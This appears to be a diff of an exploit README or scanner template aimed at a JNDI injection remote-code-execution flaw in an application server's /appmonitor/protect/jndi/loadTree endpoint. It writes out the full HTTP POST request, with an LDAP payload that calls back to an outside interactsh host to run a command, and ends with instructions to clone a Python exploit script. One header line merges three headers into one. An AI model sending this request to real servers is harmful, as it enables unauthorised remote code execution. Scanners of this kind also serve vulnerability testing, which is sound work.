@@ -21,13 +21,18 @@
 
 http:
 
-    POST /appmonitor/protect/jndi/loadTree HTTP/1.1
-    Host: {{Hostname}}
-    Content-Type: application/x-www-form-urlencoded
-
+    POST /appmonitor/protect/jndi/loadTree HTTP/1.1
+    Host: {{Hostname}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 55
+    
     jndiName=ldap://{{interactsh-url}}/Basic/Command/calc
-    Due to improper permission checks on the app server, attackers can trigger JNDI injection via the "loadTree" interface to achieve RCE (requires lower JDK versions). Legacy vuln, patched in August. EAS is also affected with a different path.
-
+    
 ### 1. 克隆本项目仓库到本地
     
     git clone [https://github.com/JY-666-YINZI/Python_loadTree_JNDI_script.git](https://github.com/JY-666-YINZI/Python_loadTree_JNDI_script.git)
